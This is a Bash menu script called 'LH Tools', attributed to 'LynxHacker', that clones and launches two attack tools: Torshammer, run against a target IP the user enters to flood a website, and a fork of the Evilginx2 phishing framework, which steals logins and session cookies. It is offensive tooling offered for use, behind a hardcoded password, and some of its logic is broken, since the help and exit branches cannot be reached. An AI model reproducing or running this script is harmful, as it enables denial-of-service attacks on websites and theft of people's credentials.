clear

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

neofetch
sleep 1
echo $cyan
echo
echo
figlet  -f slant Loading...
sleep 4
clear
echo $cyan
figlet -f slant LH Tools
echo
echo $green" Made By ➢ LynxHacker"
echo " Team ➢ UnderGround Malaysia"
echo " Website ➢ underground.ml"
echo
echo  "════════════════════════════════════════════════"
read -p "➥ Your Name ➢ " name;
read -p "➥ Password ➢ " pass;
echo  "════════════════════════════════════════════════"
if [ "${pass:-}" = "subs" ]
then
sleep 1
clear
echo "Welcome," $name;
echo $green"════════════════════════════════════════════════"
echo $cyan"[                    LH TOOLS                  ]"
echo $green"════════════════════════════════════════════════"
echo $purple"[ 1 ] Torshammer"
echo $red"[ 2 ] EvilGinx2"
echo $blue"Other Coming Soon!"
echo $white
read -p "Choose Number ➢ " choose;
#Option 1
# TorsHammer
if [ "${choose:-}" = "1" ]
then
pkg update
pkg install git
pkg install tor
pkg install python2
git clone https://github.com/dotfighter/torshammer.git
cd torshammer
clear
sleep 1
echo $blue"════════════════════════════════════════════════"
echo $blue"[                  TorsHammer                ]"
echo $blue"════════════════════════════════════════════════"
echo "[ 1 ] Set Website Target"
echo "[ 2 ] Help"
echo "[ 3 ] Exit"
read -p "Choose ➢ " torshammer;
if [ "${torshammer:-}" = "1" ]
then
sleep 1
clear
echo
echo $purple
read -p "Target [ip address] ➢ " tortarget;
read -p "Threads [default:256] ➢ " th
python2 torshammer.py -t $tortarget -r $th
if [ "${torshammer:-}" = "2" ]
then
python2 torshammer.py -h
fi
if [ "${torshammer:-}" = "3" ]
then
exit
fi
fi
fi
fi

if [ "${choose}" = "2" ]
then
pkg update
pkg install git
pkg install python2
git clone https://github.com/An0nUD4Y/evilginx2.git
cd evilginx2
go run main.go
fi

if [ "${pass:-}" != "subs" ]
then
clear
echo $red
figlet -f slant Wrong!!!
echo $red"Try Again..."
sleep 6
sh LH.sh
fi